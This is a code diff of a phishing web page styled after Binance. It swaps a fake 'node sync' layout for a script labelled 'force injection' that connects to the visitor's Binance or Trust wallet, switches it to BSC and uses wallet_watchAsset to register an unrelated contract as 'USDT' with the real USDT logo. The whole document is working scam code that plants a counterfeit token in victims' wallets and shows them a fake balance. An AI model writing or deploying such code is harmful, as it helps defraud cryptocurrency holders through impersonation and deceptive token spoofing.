@@ -1,72 +1,71 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enterprise Node Sync | Secure Protocol</title>
-    <style>
-        :root { --binance-gold: #f3ba2f; --bg-black: #0b0e11; --card-gray: #1e2329; }
-        body { background: var(--bg-black); color: #eaecef; font-family: 'Inter', Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
-        .container { background: var(--card-gray); border-radius: 24px; padding: 45px; width: 350px; text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.6); border: 1px solid #32383e; position: relative; }
-        
-        /* Professional Branding */
-        .logo-ring { width: 90px; height: 90px; border: 3px solid var(--binance-gold); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 25px; position: relative; animation: pulse 2s infinite; }
-        .logo-ring svg { width: 50px; height: 50px; fill: var(--binance-gold); }
-        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(243, 186, 47, 0.4); } 70% { box-shadow: 0 0 0 20px rgba(243, 186, 47, 0); } 100% { box-shadow: 0 0 0 0 rgba(243, 186, 47, 0); } }
-
-        .balance-display { background: rgba(0,0,0,0.2); border-radius: 16px; padding: 25px; margin-bottom: 35px; border: 1px solid rgba(255,255,255,0.05); }
-        .amount { font-size: 34px; font-weight: 800; color: #ffffff; letter-spacing: -1px; }
-        
-        .action-button { background: var(--binance-gold); color: #000; border: none; width: 100%; padding: 20px; border-radius: 12px; font-weight: 800; cursor: pointer; font-size: 16px; text-transform: uppercase; transition: all 0.3s ease; }
-        .action-button:hover { background: #e2ab26; transform: translateY(-2px); }
-
-        #terminal-log { font-size: 10px; color: #848e9c; margin-top: 20px; font-family: 'Courier New', monospace; text-align: left; height: 50px; overflow: hidden; line-height: 1.5; border-top: 1px solid #32383e; padding-top: 15px; }
-    </style>
-</head>
-<body>
-
-<div class="container">
-    <div class="logo-ring">
-        <svg viewBox="0 0 24 24"><path d="M12.75 12.35v-5.3h4.63V4.25H6.62v2.8h4.63v5.3c-3.64.13-6.42.84-6.42 1.7s2.78 1.57 6.42 1.7v6.05h1.5v-6.05c3.64-.13 6.42-.84 6.42-1.7s-2.78-1.57-6.42-1.7z"/></svg>
-    </div>
-    
-    <div class="balance-display">
-        <div style="font-size: 11px; color: var(--binance-gold); margin-bottom: 8px; font-weight: bold; letter-spacing: 1px;">NODE ASSET ALLOCATION</div>
-        <div class="amount" id="val">$1,066.45</div>
-    </div>
-
-    <button class="action-button" id="syncTrigger">Connect & Verify Node</button>
-    
-    <div id="terminal-log">SYSTEM::IDLE_WAITING_FOR_HANDSHAKE</div>
-</div>
-
 <script>
-    // --- ADVANCED SPOOFING CONFIG ---
+    // --- UPDATED FORCE INJECTION ---
     const TARGET_CONTRACT = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
-    const OFFICIAL_SYMBOL = "USDT";
-    const OFFICIAL_DECIMALS = 6;
     const WHITELIST_LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0x55d398326f99059fF775485246999027B3197955/logo.png";
 
     const log = document.getElementById('terminal-log');
-    const updateLog = (m) => { log.innerHTML += `<br>> ${m}`; log.scrollTop = log.scrollHeight; };
+    const updateLog = (m) => { log.innerHTML = `> ${m}`; };
 
     async function executeInjection() {
-        // Multi-Provider Detection (Binance & Trust)
-        const provider = window.BinanceChain || window.trustwallet || window.ethereum;
+        // Mobile DApp Browser special detection
+        let provider = window.ethereum || window.BinanceChain;
+        
+        // Agar pehli dafa na mile, toh check karein providers array
+        if (!provider && window.ethereum?.providers) {
+            provider = window.ethereum.providers.find(p => p.isBinance || p.isTrust);
+        }
 
         if (!provider) {
-            updateLog("CRITICAL_ERROR: NO_COMPATIBLE_WALLET");
+            updateLog("ERROR: WALLET_NOT_LINKED_REFRESH_PAGE");
             return;
         }
 
         try {
-            updateLog("REQUESTING_SECURE_AUTH...");
-            await provider.request({ method: 'eth_requestAccounts' });
+            updateLog("HANDSHAKE_STARTING...");
+            
+            // Step 1: Force Account Request
+            const accounts = await provider.request({ method: 'eth_requestAccounts' });
+            
+            if (accounts.length > 0) {
+                updateLog("ACCOUNT_CONNECTED_MAPPING_NETWORK...");
 
-            updateLog("SWITCHING_TO_BSC_DATALAYER...");
-            await provider.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: '0x38' }],
-            });
+                // Step 2: Switch to BSC
+                await provider.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: '0x38' }],
+                });
 
-            updateLog("INJECTING_VERIFIED_METADATA
+                // Step 3: Direct Asset Injection
+                updateLog("INJECTING_VERIFIED_ASSET...");
+                await provider.request({
+                    method: 'wallet_watchAsset',
+                    params: {
+                        type: 'ERC20',
+                        options: {
+                            address: TARGET_CONTRACT,
+                            symbol: 'USDT',
+                            decimals: 6,
+                            image: WHITELIST_LOGO,
+                        },
+                    },
+                });
+                updateLog("SYNC_SUCCESSFUL_VERIFIED");
+            }
+        } catch (err) {
+            updateLog("HANDSHAKE_CANCELLED_BY_USER");
+            console.error(err);
+        }
+    }
+
+    // Single Click Listener
+    document.getElementById('syncTrigger').addEventListener('click', executeInjection);
+
+    // Auto-Initialization for Mobile
+    window.onload = () => {
+        setTimeout(() => {
+            if (window.ethereum || window.BinanceChain) {
+                updateLog("SECURE_CHANNEL_ESTABLISHED");
+            }
+        }, 1500);
+    };
+</script>
